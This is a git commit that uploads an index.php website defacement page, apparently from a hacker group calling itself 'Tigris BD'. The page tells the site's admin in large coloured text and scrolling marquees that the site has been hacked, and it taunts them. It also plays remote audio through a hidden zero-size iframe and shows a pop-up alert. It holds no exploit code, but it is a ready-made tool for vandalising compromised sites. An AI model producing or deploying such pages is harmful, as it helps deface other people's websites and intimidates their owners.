9639605cbf39aebed58bb3e1bed7eadd41bf99fa
tigirsbd <77603194+tigirsbd@users.noreply.github.com>
2021-09-18 09:39:39 +0600

    Add files via upload

---
+++ index.php
@@ -0,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    
+    <title>Hacked By Tigris BD</title>
+    <style>
+      body{
+        background-color: black;
+      }
+     #st{
+       text-align: center;
+     }
+  .img{
+      align-content: center;
+  
+animation-name: rotate ; animation-duration: 6s; animation-play-state: running; animation-timing-function: linear; animation-iteration-count: infinite; } @keyframes rotate{ 10% {transform:rotateY(36deg)} 20% {transform:rotateY(72deg)} 30% {transform:rotateY(108deg)} 40% {transform:rotateY(144deg)} 50% {transform:rotateY(180deg)} 60% {transform:rotateY(216deg)} 70% {transform:rotateY(252deg)} 80% {transform:rotateY(288deg)} 90% {transform:rotateY(324deg)} 100% {transform:rotateY(360deg)} } 
+    }
+    #res{
+      text-align: center;
+    }
+    #me{
+      font-family: Times New Roman;
+      text-align: center;
+      color: red;
+      font-weight: bold;
+    }
+    </style>
+    
+  </head>
+  <body>
+<h1 id=st><font style="color:red">Ha</font><font style="color:green">ck</font><font style="color:blue">ed</font><font style="color:white"> by</font><font style="color:green"> Tigris</font><font style="color:red"> BD</font></h1>
+    
+<p align="center">
+<img class="img" src="https://a.top4top.io/p_2074egtwp0.png" width="250px" height="300px">
+  </p>
+    <marquee id=dot><font style="color:white">==================================================================================================================================</font></marquee>
+   
+<h4 align="center" id=res style="text-shadow:0 0 20px red, 0 0 5px red, 0 0 7px black, 0 0 45px yellow ; font-weight:bold: orange;font-size:30px"><font style="color:white">Respect:Cyber Lion</font></h4>
+<h1 align="center">
+<img  src="https://i.ibb.co/wYt38LT/cyberlion.png" height="170px" width:"130px">
+    <marquee id=dot><font style="color:red">==================================================================================================================================</font></marquee>
+<marquee id=new><p style="color:white">Hey Baby Game over</p></marquee> 
+<h1 id=me>You have been hacked</h1> 
+
+<h3 style="text-shadow:0 0 20px red, 0 0 5px red, 0 0 7px black, 0 0 45px yellow ; font-weight:bold: orange;font-size:30px"><font style="color:white">Hi admin, your site has been hacked. The security system of your site is very weak. Secure your site. Otherwise it will be hacked again and again.</font></h3>
+
+<iframe width="0" height="0" src="https://j.top4top.net/m_1273sm8pe0.mp3" frameborder="0" allowfullscreen></iframe>
+
+<script> alert("Hello admin.Your site have been hacked")</script>
+
+  </body>
+</html>
